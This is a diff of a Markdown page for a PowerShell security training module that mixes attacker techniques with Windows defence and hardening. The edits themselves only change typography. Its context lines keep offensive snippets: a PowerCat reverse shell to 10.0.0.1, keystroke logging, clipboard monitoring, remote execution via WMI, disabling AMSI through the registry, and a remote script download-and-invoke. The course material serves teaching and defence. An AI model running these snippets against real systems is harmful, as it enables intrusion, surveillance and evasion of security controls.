@@ -1,4 +1,4 @@
----
+﻿---
 ref: cmap-powershell
 title: CMAP Module 6 - Empowering the PowerShell
 date: 2022-10-25T00:00:00+00:00
@@ -8,7 +8,7 @@ permalink: /en/powershell/
 sitemap: false
 ---
 
-## 1. Hackers and PowerShell - Power(S)Hell
+## 1. Hackers and&nbsp;PowerShell - Power(S)Hell
 
 ### Basic Techniques
 
@@ -24,7 +24,7 @@ $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($p
 "powershell.exe -EncodedCommand $encodedPayload" | Set-Clipboard
 ```
 
-#### Running Scripts from Web
+#### Running Scripts from&nbsp;Web
 
 ```powershell
 # PowerShell 2
@@ -82,7 +82,7 @@ Get-PrivateProfileString -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
 
 ### Office Macros
 
-#### PowerShell Autorun from Macro
+#### PowerShell Autorun from&nbsp;Macro
 ```vb
 ' Word Compatibility
 Sub Auto_Open()
@@ -183,15 +183,15 @@ Invoke-Command -ComputerName dc -ScriptBlock { calc.exe }
 
 #### WMI
 
-[Create method of the Win32_Process class](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process)
+[Create method of&nbsp;the&nbsp;Win32_Process class](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process)
 
 ```powershell
 Invoke-WmiMethod -ComputerName dc -Class Win32_Process -Name Create -ArgumentList calc.exe
 ```
 
-[Defender ASR: Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)
+[Defender ASR: Block process creations originating from&nbsp;PSExec and&nbsp;WMI commands](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)
 
-#### Reverse TCP Shell with PowerCat
+#### Reverse TCP Shell with&nbsp;PowerCat
 
 [PowerCat GitHub](https://github.com/besimorhino/powercat)
 
@@ -217,7 +217,7 @@ powercat -c 10.0.0.1 -p 8000 -ep
 
 #### Clipboard Monitoring
 
-> Works with RDP, too.
+> Works with&nbsp;RDP, too.
 
 ```powershell
 1..100 | % { Get-Clipboard -Format Text; Start-Sleep -Seconds 3 }
@@ -242,7 +242,7 @@ Write-Host ('The password is "{0}"!' -f $cred.GetNetworkCredential().Password)
 Get-Keystrokes -LogPath keystrokes.txt -Timeout 1 -PassThru
 ```
 
-#### Audio Recording from Microphone
+#### Audio Recording from&nbsp;Microphone
 
 [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
 
@@ -361,7 +361,7 @@ Stop-Inveigh
 
 ### AMSI Bypass
 
-#### Disable as Admin
+#### Disable as&nbsp;Admin
 
 Registered providers: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI`
 
@@ -371,7 +371,7 @@ Get-ChildItem -Path 'registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI' -Recu
     ForEach-Object { Rename-Item -Path $PSItem.PSPath -NewName ($PSItem.PSChildName + '-Disabled' ) }
 ```
 
-#### Re-Enable as Admin
+#### Re-Enable as&nbsp;Admin
 
 ```powershell
 Get-ChildItem -Path 'registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI' -Recurse |
@@ -379,9 +379,9 @@ Get-ChildItem -Path 'registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI' -Recu
     ForEach-Object { Rename-Item -Path $PSItem.PSPath -NewName ($PSItem.PSChildName -replace '-Disabled','') }
 ```
 
-#### Disable as User
+#### Disable as&nbsp;User
 
-> Note: These methods may be caught by AVs
+> Note: These methods may be&nbsp;caught by&nbsp;AVs
 
 [AMSI Bypass Methods](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 
@@ -398,7 +398,7 @@ Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://comm
 
 #### Constrained Language Mode
 
-- [Script rules in AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/script-rules-in-applocker)
+- [Script rules in&nbsp;AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/script-rules-in-applocker)
 - [Device Guard User Mode Code Integrity (UMCI)](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/select-types-of-rules-to-create)
 
 
@@ -430,11 +430,11 @@ $transcript.Path
 notepad.exe $transcript.Path
 ```
 
-#### Script Execution and Module Logging
+#### Script Execution and&nbsp;Module Logging
 
-- [Script Tracing and Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
+- [Script Tracing and&nbsp;Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
 - [Greater Visibility Through PowerShell Logging](https://www.mandiant.com/resources/blog/greater-visibilityt)
-- [PowerShell ♥ the Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/)
+- [PowerShell ♥ the&nbsp;Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/)
 
 ![PowerShell 5 Logging](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png)
 
@@ -719,7 +719,7 @@ function ConvertFrom-XmlDuration
 #endregion Helper Functions
 ```
 
-#### Microsoft Defender for Endpoint
+#### Microsoft Defender for&nbsp;Endpoint
 
 ![](../assets/images/powershell_atp1.png)
 
@@ -741,7 +741,7 @@ Get-ChildItem -Path .\ScriptsToSign -File -Include @('*.ps1','*.psd1','*.psm1') 
 Get-AuthenticodeSignature -FilePath script.ps1
 ```
 
-### Run as Administrator
+### Run as&nbsp;Administrator
 
 ```cmd
 @ECHO OFF
@@ -780,7 +780,7 @@ Backup-GPO -Path $backupPath -All | Out-Null
 %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File C:\Scripts\Invoke-GPOBackup.ps1
 ```
 
-> Permissions for script and output dirs!
+> Permissions for&nbsp;script and&nbsp;output dirs!
 
 ##### Register Task
 
@@ -847,7 +847,7 @@ Get-MgUser
  Connect-MgGraph -ClientID c3f7da84-2712-43e5-b5dd-70f3cd0e4bbd -TenantId 6c6e13e5-6627-445a-bcd6-db1e297f30c4 -CertificateName AADScriptCert
 ```
 
-[Use app-only authentication with the Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/app-only?view=graph-powershell-1.0&tabs=azure-portal)
+[Use app-only authentication with&nbsp;the&nbsp;Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/app-only?view=graph-powershell-1.0&tabs=azure-portal)
 
 ## 3. Active Directory Security Assessment
 
@@ -1016,7 +1016,7 @@ Start-DscConfiguration -Path .\WindowsServerSecurityBaseline -Wait -Force -Verbo
 - [Microsoft Security Compliance Toolkit 1.0 ](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
 - [Quickstart: Convert Group Policy into DSC](https://learn.microsoft.com/en-us/powershell/dsc/quickstarts/gpo-quickstart)
 
-#### Center for Internet Security (CIS) Benchmarks
+#### Center for&nbsp;Internet Security (CIS) Benchmarks
 - [CIS Benchmarks](https://www.cisecurity.org/benchmark/microsoft_windows_server)
 - [CIS DSC](https://github.com/techservicesillinois/SecOps-Powershell-CISDSC)
 
